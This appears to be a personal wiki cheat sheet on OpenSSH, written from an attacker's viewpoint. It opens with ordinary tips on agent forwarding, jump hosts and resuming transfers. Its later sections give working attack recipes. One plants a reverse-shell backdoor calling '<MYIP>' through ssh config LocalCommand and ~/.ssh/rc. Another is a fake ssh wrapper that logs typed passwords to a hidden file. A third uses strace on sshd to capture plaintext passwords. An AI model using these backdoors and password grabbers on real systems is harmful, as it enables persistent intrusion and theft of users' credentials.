---
title: OpenSSH
description: A quick summary of Openssh
published: true
date: 2023-01-14T04:10:15.813Z
tags: 
editor: markdown
dateCreated: 2022-10-01T21:23:50.953Z
---


# SSH Agent
```
eval `ssh-agent`
ssh-add # Will add all keys from ~/.ssh
ssh-add -l # Displays the added keys
```

then use ssh -A to forward 


# Resuming an SCP transfer
```
rsync -e ssh \
--partial --append \
--progress \
remote.example.org:/path/to/file .
```

# Using a Jumphost
```
ssh -D 12344 -J me@jumphost root@unreachable-host
```

# Proxy Command
```
ssh -o ProxyCommand="ssh -W %h:%p bob@10.10.10.10" bob@remote
ssh -o ProxyCommand="ncat --proxy proxyhsot 1080 %h %p" bob@remote
```

# AUTOSSH
```
#Run on remote host
autossh -M 0 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" -R 127.0.0.1:2222:127.0.0.1:22 hackbox

#Run on hackbox
ssh -P 2222 bob@localhost
get into remote box
```

# Stuff inside ssh
```
~? - help message
~# show forwarded connections.
~~ send excape character (by doing it twice)
?C - Command Line

CommandLineCommands
ssh> ?
Commands:
      -L[bind_address:]port:host:hostport    Request local forward
      -R[bind_address:]port:host:hostport    Request remote forward
      -D[bind_address:]port                  Request dynamic forward
      -KL[bind_address:]port                 Cancel local forward
      -KR[bind_address:]port                 Cancel remote forward
      -KD[bind_address:]port                 Cancel dynamic forward
```

# Rude SSH Backdoor
```
#cat ~/ssh/config

Hostname *
	PermitLocalCommand true
	Localcommand ncat -e /bin/bash <MYIP> 4141 &

```

```
# cat ~/.ssh/rc
ncat -e /bin/bash <MYIP> 4141 &
```

# Rude password grabber
```
# cat /usr/local/bin/ssh

#!/bin/bash
read -esp "${1}'s password: " password
echo "$1 - $password" >> /tmp/.creds
echo
 /usr/bin/ssh $@
 
```

# Pull passwords out of ssh
ps --ppid 1 | grep sshd
strace -f -p 641 -e read |& grep -F "\f\0\0\0"

[pid 2235] read(6, "\f\0\0\0\10secret", 10) = 10
